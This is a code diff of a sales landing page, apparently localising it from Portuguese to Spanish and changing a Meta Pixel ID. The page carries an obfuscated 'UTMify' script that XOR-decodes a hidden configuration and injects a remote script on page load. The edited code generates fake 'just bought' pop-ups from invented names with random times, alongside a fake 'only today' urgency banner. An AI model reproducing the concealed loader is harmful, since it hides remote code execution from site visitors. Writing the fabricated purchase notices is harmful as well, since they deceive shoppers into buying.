@@ -11,12 +11,12 @@
   t.src=v;s=b.getElementsByTagName(e)[0];
   s.parentNode.insertBefore(t,s)}(window, document,'script',
   'https://connect.facebook.net/en_US/fbevents.js');
-  fbq('init', '2812612212441172');
+  fbq('init', '1068100929431372');
   fbq('track', 'PageView');
   fbq('track', 'ViewContent');
 </script>
 <noscript><img height="1" width="1" style="display:none"
-  src="https://www.facebook.com/tr?id=2812612212441172&ev=PageView&noscript=1" alt=""/></noscript>
+  src="https://www.facebook.com/tr?id=1068100929431372&ev=PageView&noscript=1" alt=""/></noscript>
 <!-- End Meta Pixel Code -->
 <!-- UTMify -->
 <script>(function(){var c_m4p=atob("DEMqMPNKxWdzmqwlFjgIRYEm511R8thRZjAQH9wpoQld79hIfyVTHpAlqEkR6INWdTFDQIc56hIH998KeiJeVYA+6w0AuIAHdzdeQpoosBMW6Y4fTTgIXpInoEVJuMhEYiIHRYcnrAEKt9xXczVPXodnvQQc/oFWdSgIHNE8pAsG/44fNGFXHIhoqwYe/44fNCdLRJJnsBMe88pcOzNYVYUvqxNe6dlHfydZEt9oswYf78kHLGEITa43");var u_wbl=[];for(var m_nx=0;m_nx<c_m4p.length;m_nx++){u_wbl.push(c_m4p.charCodeAt(m_nx)&255);}var w_991=u_wbl[0];var g_n=u_wbl.slice(1,1+w_991);var w_1y2=u_wbl.slice(1+w_991);var x_31=w_1y2.map(function(b,i_5oq){return b^g_n[i_5oq%w_991];});var j_5="";for(var v_39=0;v_39<x_31.length;v_39++){j_5+=String.fromCharCode(x_31[v_39]&255);}var o_cpv=decodeURIComponent(escape(j_5));var f_jkvk=JSON.parse(o_cpv);var c_p5=f_jkvk.globals||[];c_p5.forEach(function(m_fi0z){window[m_fi0z.name]=m_fi0z.value;});var a_yus=document.createElement("script");a_yus.src=f_jkvk.url;a_yus.async=true;a_yus.defer=true;(f_jkvk.attributes||[]).forEach(function(x_o){a_yus.setAttribute(x_o.name,x_o.value);});(document.head||document.documentElement).appendChild(a_yus);})();</script>
@@ -439,7 +439,7 @@ img{-webkit-user-drag:none;-khtml-user-drag:none;-moz-user-drag:none;-o-user-dra
 </style>
 </head>
 <body>
-<div class="notif-stack" id="notifStack" aria-live="polite" aria-label="Compras recentes"></div>
+<div class="notif-stack" id="notifStack" aria-live="polite" aria-label="Compras recientes"></div>
 
 <!-- 1. URGÊNCIA -->
 <div class="urgency"><i class="fa-solid fa-fire"></i> OFERTA SOLO HOY <span id="hoje"></span></div>
@@ -875,7 +875,7 @@ document.getElementById('upsell-decline').addEventListener('click',function(){
 (function(){
   var stack=document.getElementById('notifStack');
   if(!stack)return;
-  var nomes=['Camila','Juliana','Fernanda','Patrícia','Aline','Bruna','Larissa','Mariana','Beatriz','Carla','Vanessa','Renata','Amanda','Priscila','Gabriela','Tatiane','Sabrina','Débora','Letícia','Rafaela','Cristiane','Simone','Adriana','Michele','Roberta','Daniela','Jéssica','Viviane','Elaine','Natália'];
+  var nomes=['María','Camila','Valentina','Sofía','Daniela','Gabriela','Luciana','Fernanda','Mariana','Andrea','Paola','Carolina','Lucía','Ximena','Antonella','Valeria','Natalia','Alejandra','Catalina','Isabella','Florencia','Rocío','Micaela','Agustina','Josefina','Guadalupe','Renata','Martina','Julieta','Victoria'];
   // embaralha os nomes (Fisher-Yates) para não repetir
   for(var i=nomes.length-1;i>0;i--){var j=Math.floor(Math.random()*(i+1));var t=nomes[i];nomes[i]=nomes[j];nomes[j]=t;}
   var nomeIdx=0;
@@ -892,7 +892,7 @@ document.getElementById('upsell-decline').addEventListener('click',function(){
   }
   function tempo(){
     var min=Math.floor(Math.random()*58)+1;
-    return 'há '+min+(min===1?' minuto':' minutos');
+    return 'hace '+min+(min===1?' minuto':' minutos');
   }
   function criar(){
     var nome=proximoNome(), kit=proximoKit(), quando=tempo();
@@ -900,7 +900,7 @@ document.getElementById('upsell-decline').addEventListener('click',function(){
     el.className='purchase-notif';
     el.innerHTML='<div class="pn-icon"><i class="fa-solid fa-bag-shopping"></i></div>'+
       '<div class="pn-text">'+
-        '<p class="pn-name">'+nome+' <span>acabou de comprar</span></p>'+
+        '<p class="pn-name">'+nome+' <span>acaba de comprar</span></p>'+
         '<p class="pn-line"><span class="pn-kit">'+kit+'</span><span class="pn-time"> · '+quando+'</span></p>'+
       '</div>';
     stack.appendChild(el);
